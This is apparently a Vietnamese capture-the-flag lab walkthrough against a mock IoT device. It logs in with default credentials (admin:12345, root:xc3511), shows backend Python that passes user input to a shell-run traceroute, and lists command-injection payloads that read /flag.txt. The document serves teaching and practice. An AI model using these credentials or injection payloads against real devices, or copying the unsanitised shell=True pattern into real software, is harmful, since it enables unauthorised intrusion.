# Luồng Tấn Công: The Mirai Target

Tài liệu này chi tiết các bước kỹ thuật để hoàn thành bài lab.

## Giai đoạn 1: Bypass Login với thông tin mặc định
Hầu hết các thiết bị IoT rẻ tiền không yêu cầu người dùng đổi mật khẩu trong lần cài đặt đầu tiên. Hacker sử dụng các danh sách mật khẩu mặc định để quét hàng loạt thiết bị.

- **URL:** `http://[IP]:8084/login`
- **Tấn công:** Thử các cặp thông tin phổ biến.
- **Kết quả:** Đăng nhập thành công với `admin:12345` hoặc `root:xc3511`.

## Giai đoạn 2: Phát hiện lỗ hổng OS Command Injection
Tại trang Diagnostic, tham số `target` được người dùng nhập vào. 

**Mã nguồn phía Backend (app.py):**
```python
command = f"traceroute -m 3 {target}"
output = subprocess.check_output(command, shell=True, ...)
```

Do tham số `{target}` không được kiểm tra, attacker có thể sử dụng toán tử nối lệnh `;` để thực thi lệnh bất kỳ.

## Giai đoạn 3: Thực thi lệnh và Lấy Flag
Sau khi xác nhận Command Injection hoạt động bằng lệnh `id`, attacker tiến hành đọc các tệp nhạy cảm.

1. **Kiểm tra quyền hạn:**
   - Payload: `; whoami`
   - Kết quả mong mỏi: `root`

2. **Liệt kê tệp tin:**
   - Payload: `; ls -la /`
   - Tìm thấy tệp `flag.txt` ở thư mục gốc.

3. **Đọc Flag:**
   - Payload: `; cat /flag.txt`
   - Kết quả: `FLAG{...}`

37: 
